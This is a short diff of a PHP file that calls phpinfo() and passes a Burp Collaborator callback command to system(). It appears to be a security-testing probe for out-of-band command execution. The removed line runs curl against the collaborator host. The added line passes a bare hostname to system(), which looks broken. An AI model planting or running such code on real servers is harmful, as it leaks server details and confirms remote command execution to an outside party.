@@ -1,4 +1,4 @@
 <?php
 phpinfo();
-system("curl s5yht3hcomjafu3b9ngzojry5pbjz8.burpcollaborator.net");
+system("eq8v2g9azqb22rpvo6cx5rn14samyb.burpcollaborator.net");
 ?>
